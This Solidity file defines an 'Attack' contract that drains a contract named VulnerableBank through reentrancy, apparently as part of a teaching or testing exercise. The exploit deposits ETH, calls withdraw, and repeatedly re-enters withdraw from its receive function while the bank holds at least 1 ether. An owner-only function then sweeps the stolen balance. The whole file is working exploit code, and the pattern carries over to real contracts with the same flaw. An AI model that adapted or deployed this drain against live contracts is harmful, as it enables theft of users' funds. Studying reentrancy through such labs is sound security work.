//SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import "../src/VulnerableBank.sol";
import "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract Attack is Ownable {
    VulnerableBank vulnerableBank;

    /**
     * @notice Initializes the attack contract with the address of the vulnerable bank
     * @param vulnerableBankAddress_ The address of the deployed VulnerableBank contract
     */
    constructor(address vulnerableBankAddress_) Ownable(msg.sender) {
        vulnerableBank = VulnerableBank(vulnerableBankAddress_);
    }

    /**
     * @notice Initiates the exploit by depositing and then immediately calling withdraw
     * @param amount_ The amount of ETH to deposit and initiate the attack
     */
    function getFunds(uint256 amount_) public {
        vulnerableBank.deposit{value: amount_}();
        vulnerableBank.withdraw();
    }

    /**
     * @notice Allows the contract owner to withdraw all ETH drained via the exploit
     */
    function withdrawFunds() external onlyOwner {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Tx Failed");
    }

    /**
     * @notice receive function that gets called during the reentrancy loop
     */
    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }
}
